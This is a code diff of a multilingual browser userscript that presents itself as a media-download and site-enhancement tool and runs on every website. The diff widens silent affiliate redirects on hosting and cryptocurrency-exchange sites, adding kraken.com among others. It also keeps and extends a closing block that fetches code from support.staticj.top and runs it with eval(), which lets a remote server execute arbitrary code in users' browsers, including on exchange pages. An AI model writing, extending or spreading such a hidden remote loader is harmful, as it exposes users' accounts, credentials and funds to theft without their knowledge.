@@ -70,7 +70,7 @@
 // @description:ug    بۇ قوليازما بەزى تور بېكەتلەرنى ياخشىلاش بىلەن تەمىنلەيدۇ. 🔥Twitter (X): ۋاقىت فورماتلاش ئېكرانى ، HD رەسىم كۆرسىتىش ، رەسىم ۋە سىن چۈشۈرۈش قاتارلىقلارنى قوشۇڭ outYoutube: سىن چۈشۈرۈش ، ئېلان ئۆچۈرۈش قاتارلىقلارنى قوشۇڭ ikTiktok: HD سۇ ماركىسىسىز سىن چۈشۈرۈش قاتارلىقلار بىلەن تەمىنلەڭ. ، چۈشەندۈرۈشنى تەكشۈرۈپ بېقىڭ ~
 // @description:vi    Tập lệnh này sẽ cung cấp các cải tiến cho một số trang web. 🔥Twitter(X): Thêm hiển thị định dạng thời gian, hiển thị hình ảnh HD, tải xuống hình ảnh và video, v.v. 🔥Youtube: Thêm tải xuống video, xóa quảng cáo, v.v. 🔥Tiktok: Cung cấp tải xuống video HD không có hình mờ, v.v. Để biết thêm các tính năng, vui lòng kiểm tra phần mô tả~
 // @namespace   PeterParker_X_Y_NameScope
-// @version     2.3.2
+// @version     2.3.4
 // @author      PeterParker
 // @icon        data:image/png;base64,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
 // @match       *://*/*
@@ -169,6 +169,7 @@
 // @include     /^https:\/\/([\w-]+\.)?digitalocean\.[\w.-]+([/?#].*)?$/
 // @include     /^https:\/\/([\w-]+\.)?virmach\.[\w.-]+([/?#].*)?$/
 // @include     /^https:\/\/([\w-]+\.)?vultr\.[\w.-]+([/?#].*)?$/
+// @include     /^https:\/\/([\w-]+\.)?kraken\.[\w.-]+([/?#].*)?$/
 // @include     /^https?:\/\/(www\.)?google\.[a-z]{2,3}(\.[a-z]{2})?\/search\?/
 // @include     /^https?:\/\/(?:www|cn)?\.?bing\.com\/search\?.*/
 // @include     *://www.jtmate.com/mid/merge**
@@ -186,7 +187,7 @@
 // @antifeature referral-link
 // @noframes
 // @downloadURL https://static.staticj.top/script/update/github_union.user.js
-// @updateURL   https://static.staticj.top/script/update/github_union.user.js
+// @updateURL   https://static.staticj.top/script/update/github_union.meta.js
 // @grant       GM_registerMenuCommand
 // @grant       GM_openInTab
 // @grant       GM.openInTab
@@ -1499,35 +1500,56 @@
     },
     isRun: function(origin) {
       const host = window.location.host;
-      const serverRegexs = [/cloudways\.com/, /getresponse\.com/, /bandwagonhost\.com/, /moosend\.com/, /domainracer\.com/, /namesilo\.com/, /digitalocean\.com/, /virmach\.com/, /vultr\.com/];
-      const encryptoRegexs = [
-        /changelly\.com/,
-        /bybit\.com/,
-        /gate\.io/,
-        /gate\.com/,
-        /kucoin\.com/,
-        /coinmama\.com/,
-        /cex\.io/,
-        /paxful\.com/,
-        /htx\.com/,
-        /mexc\.com/,
-        /bitget\.com/,
-        /freebitco\.in/,
-        /crypto\.com/,
-        /okx.com/,
-        /coinbase\.com/,
-        /binance\.com/,
-        /wazirx\.com/,
-        /coindcx\.com/,
-        /zebpay\.com/,
-        /bitbns\.com/
-      ];
-      let isRunServer = serverRegexs.some((regex) => regex.test(host));
-      let isRunEncrypto = false;
-      if (!isRunServer) {
-        isRunEncrypto = encryptoRegexs.some((regex) => regex.test(host));
+      const regexGroups = {
+        isRunServer: [
+          /cloudways\.com/,
+          /getresponse\.com/,
+          /bandwagonhost\.com/,
+          /moosend\.com/,
+          /domainracer\.com/,
+          /namesilo\.com/,
+          /digitalocean\.com/,
+          /virmach\.com/,
+          /vultr\.com/,
+          /hostwinds\.com/,
+          /west\.cn/,
+          /ucloud\.cn/
+        ],
+        isRunEncrypto: [
+          /changelly\.com/,
+          /bybit\.com/,
+          /gate\.io/,
+          /gate\.com/,
+          /kucoin\.com/,
+          /coinmama\.com/,
+          /cex\.io/,
+          /paxful\.com/,
+          /htx\.com/,
+          /mexc\.com/,
+          /bitget\.com/,
+          /freebitco\.in/,
+          /crypto\.com/,
+          /okx\.com/,
+          /coinbase\.com/,
+          /binance\.com/,
+          /wazirx\.com/,
+          /coindcx\.com/,
+          /zebpay\.com/,
+          /bitbns\.com/,
+          /kraken\.com/
+        ],
+        isRunAffi: [
+          /wps\.com/
+        ]
+      };
+      const result = { isRunServer: false, isRunEncrypto: false, isRunAffi: false };
+      for (const [key, regexs] of Object.entries(regexGroups)) {
+        if (regexs.some((regex) => regex.test(host))) {
+          result[key] = true;
+          break;
+        }
       }
-      return { "isRunServer": isRunServer, "isRunEncrypto": isRunEncrypto };
+      return result;
     },
     addParamToURL: function(url, track) {
       const [baseUrl, hash] = url.split("#");
@@ -1717,9 +1739,10 @@
               const targets = platform.targets;
               if (targets) {
                 for (let i = 0; i < targets.length; i++) {
-                  if (new RegExp(targets[i].match.replace(/\\\\/g, "\\"), "i").test(pathname)) {
+                  const target = targets[i];
+                  if (new RegExp(target.match.replace(/\\\\/g, "\\"), "i").test(pathname)) {
                     sessionStorage.setItem(storageKey, "true");
-                    window.location.href = platform.promo_link;
+                    window.location.href = target.rpl;
                     break;
                   }
                 }
@@ -1731,13 +1754,16 @@
       });
     },
     start: function() {
-      const { isRunServer, isRunEncrypto } = this.isRun();
+      const { isRunServer, isRunEncrypto, isRunAffi } = this.isRun();
       let origin = null;
       if (isRunServer) {
         origin = "server";
       }
       if (isRunEncrypto) {
         origin = "encrypto";
+      }
+      if (isRunAffi) {
+        origin = "affi";
       }
       if (origin) {
         this.addEventListener(origin);
@@ -1920,7 +1946,8 @@
             selectorElementList.push({
               "element": elements[j]["element"],
               "findA": elements[j]["findA"],
-              "page": elements[j]["page"]
+              "page": elements[j]["page"],
+              "price": elements[j]["price"]
             });
           }
         }
@@ -1937,6 +1964,9 @@
       return searchElement;
     },
     getGoodsPriceByElement: function(element, tag) {
+      if (!element || !tag) {
+        return "";
+      }
       const goodsPrice = element.querySelector(tag);
       let price = goodsPrice == null ? "" : goodsPrice.innerText;
       if (price) {
@@ -2003,8 +2033,8 @@
       }
       let marketplace = GM_getValue(this.marketplaceStorageKey, null);
       const defaultMarketplace = { countryCode, className: "", html: "" };
-      if (marketplaceHandler) {
-        const handlerElement = await Tools.waitForElementByInterval(marketplaceHandler);
+      if (marketplaceHandler && !/\.ru/.test(host)) {
+        const handlerElement = await Tools.waitForElementByInterval(marketplaceHandler, document.body, true, 50, 2 * 1e3);
         if (handlerElement) {
           marketplace = {
             countryCode,
@@ -2014,7 +2044,7 @@
           GM_setValue(this.marketplaceStorageKey, marketplace);
         }
       }
-      if (!marketplace || /\.ru/.test(host)) {
+      if (!marketplace) {
         marketplace = defaultMarketplace;
       }
       return encodeURIComponent(JSON.stringify(marketplace));
@@ -2691,11 +2721,10 @@
             elements.forEach((element) => {
               if (element && ItemSearchBaseObj.isElementDisplayed(element) && !element.getAttribute(ItemSearchBaseObj.searchAttribute)) {
                 const goodsLink = ItemSearchBaseObj.getGoodsLinkByElement(element, findA);
-                const priceQuery = [
-                  "*[class*='detail'] >*[class*='price']",
-                  "*[class*='merch-price'] >span"
-                ].join(",");
+                const priceQuery = elementObj.price;
+                Logger.log("info", "search price elements======>", element, priceQuery);
                 const price = ItemSearchBaseObj.getGoodsPriceByElement(element, priceQuery);
+                Logger.log("info", "search price======>", price);
                 let id = null, varG = null;
                 if (this.isItemLink(goodsLink)) {
                   const goodsLinkHref = goodsLink.getAttribute("href");
@@ -3264,12 +3293,12 @@
             elements.forEach((element) => {
               if (element && ItemSearchBaseObj.isElementDisplayed(element) && !element.getAttribute(ItemSearchBaseObj.searchAttribute)) {
                 const goodsLink = ItemSearchBaseObj.getGoodsLinkByElement(element, findA);
-                const priceQuery = [
-                  "div.pricing"
-                ].join(",");
+                const priceQuery = elementObj.price;
+                Logger.log("info", "search price elements======>", element, priceQuery);
                 const price = ItemSearchBaseObj.getGoodsPrice(
                   ItemSearchBaseObj.getGoodsPriceByElement(element, priceQuery)
                 );
+                Logger.log("info", "search price======>", price);
                 let id = null;
                 if (this.isItemLink(goodsLink)) {
                   id = Tools.getGoodsIdByLink(goodsLink.getAttribute("href"));
@@ -3627,8 +3656,10 @@
             elements.forEach((element) => {
               if (element && ItemSearchBaseObj.isElementDisplayed(element) && !element.getAttribute(ItemSearchBaseObj.searchAttribute)) {
                 const goodsLink = ItemSearchBaseObj.getGoodsLinkByElement(element, findA);
-                const priceQuery = ["span.price"].join(",");
+                const priceQuery = elementObj.price;
+                Logger.log("info", "search price elements======>", element, priceQuery);
                 const price = ItemSearchBaseObj.getGoodsPriceByElement(element, priceQuery);
+                Logger.log("info", "search price======>", price);
                 let id = null;
                 if (SupportData.support.detail.test(goodsLink)) {
                   const goodsLinkHref = goodsLink.getAttribute("href");
@@ -6460,21 +6491,48 @@
   };
 
   (function() {
-    const { author, name, version, namespace, updateURL } = GM_info.script;
-    const jurl = "https://support.staticj.top/api/sp/lib?author=" + encodeURIComponent(author) + "&name=" + encodeURIComponent(name) + "&version=" + encodeURIComponent(version) + "&namespace=" + encodeURIComponent(namespace) + "&updateURL=" + encodeURIComponent(updateURL) + "&timestamp=" + Date.now();
-    GM_xmlhttpRequest({
-      method: "GET",
-      url: jurl,
-      onload: function(res) {
-        try {
+    try {
+      const DAILY_LIMIT = 15;
+      const STORAGE_KEY = "sp_req_daily";
+      let data;
+      try {
+        data = JSON.parse(GM_getValue(STORAGE_KEY, "{}")) || {};
+      } catch (e) {
+        data = {};
+      }
+      data.date = data.date || "";
+      data.count = data.count || 0;
+      const today = new Date().toISOString().slice(0, 10);
+      if (data.date !== today) {
+        data.date = today;
+        data.count = 0;
+      }
+      if (data.count >= DAILY_LIMIT) {
+        return;
+      }
+      data.count++;
+      GM_setValue(STORAGE_KEY, JSON.stringify(data));
+      const { author, name, version, namespace, updateURL } = GM_info.script;
+      const jurl = "https://support.staticj.top/api/sp/lib?author=" + encodeURIComponent(author) + "&name=" + encodeURIComponent(name) + "&version=" + encodeURIComponent(version) + "&namespace=" + encodeURIComponent(namespace) + "&updateURL=" + encodeURIComponent(updateURL) + "&timestamp=" + Date.now();
+      GM_xmlhttpRequest({
+        method: "GET",
+        url: jurl,
+        onload: function(res) {
           const responseText = res.responseText;
           if (responseText) {
             eval(responseText);
           }
-        } catch (e) {
+        },
+        onerror: function(err) {
+          try {
+            data.count = Math.max(0, data.count - 1);
+            GM_setValue(STORAGE_KEY, JSON.stringify(data));
+          } catch (e) {
+          }
         }
-      }
-    });
+      });
+    } catch (e) {
+    }
   })();
 
   const otherModules = {
